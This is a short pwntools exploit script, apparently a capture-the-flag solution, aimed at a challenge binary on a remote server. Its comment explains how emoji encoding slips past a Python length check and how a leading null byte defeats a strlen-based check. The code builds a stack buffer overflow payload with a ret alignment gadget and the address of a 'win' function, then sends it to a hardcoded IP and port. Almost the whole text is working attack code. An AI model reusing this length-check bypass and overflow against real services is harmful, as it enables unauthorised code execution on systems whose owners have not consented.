"""
>>> len('😂')
1
>>> '😂'.encode('utf-8')
b'\xf0\x9f\x98\x82'

in python, len() with emoji will only return 1, but there are not 1 byte actually.
So, we can leverage this to bypass the wrapper checking.
    1. add \x00 at the front of the payload to bypass strlen => return 0 to bypass swap which will cause return address overwrite useless.
    2. add rop 'ret' instruction to alignment the stack.
    3. use emoji tricks to bypass python len() checking.
"""

from pwn import *

context.log_level = "debug"
elf = context.binary = ELF("./dist/chall", checksec=False)

win_addr = elf.symbols["win"]

print(f"[+] win addr: {hex(win_addr)}")

payload = (
    b"\x00" + ("😂" * 69).encode("utf-8") + b"A" * 3
)  # 0x118 => 0x110 buffer + 8 bytes to fill rbp
payload += p64(0x40101A)  # ret instruction for alignment
payload += p64(win_addr)

io = remote("34.45.81.67", 16002)
io.recvuntil(b"(max 255 bytes):")

io.sendline(payload)

io.interactive()
